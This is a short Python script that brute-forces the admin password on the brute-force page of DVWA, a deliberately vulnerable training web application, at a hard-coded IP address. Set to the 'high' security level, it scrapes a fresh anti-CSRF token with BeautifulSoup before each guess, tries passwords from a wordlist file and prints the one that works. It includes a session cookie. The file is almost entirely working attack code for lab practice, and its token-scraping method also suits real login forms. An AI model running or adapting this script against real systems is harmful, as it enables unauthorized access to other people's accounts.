'''
@Descripttion: 
@version: 
@Author: chalan630
@Date: 2020-04-17 17:14:11
@LastEditTime: 2020-04-17 20:14:04
'''

from bs4 import BeautifulSoup
import requests

header = {
    'Cookie': 'security=high; PHPSESSID=02krk6ekcvc7ofissuaibfivh4'
}

url = "http://118.89.65.237/DVWA/vulnerabilities/brute/"


def get_token(url, header):
    str_get = requests.get(url=url, headers=header)
    bs = BeautifulSoup(str_get.text, "html.parser")
    user_token = bs.find_all('input')[3].get('value')
    return user_token, str_get


user_token, str_ = get_token(url, header)
i = 1
for line in open("rkolin.txt"):
    url = "http://118.89.65.237/DVWA/vulnerabilities/brute/" + \
          "?username=admin&password=" + line.strip() + \
          "&Login=Login&user_token=" + user_token
    user_token, str_ = get_token(url, header)
    code = str_.status_code
    length = len(str_.text)
    print(i, 'admin', line.strip(), code, length)
    if 'Username and/or password incorrect.' in str_.text:
        i += 1
        continue
    else:
        print("Success!,Password is '%s'" % line.strip())
        break
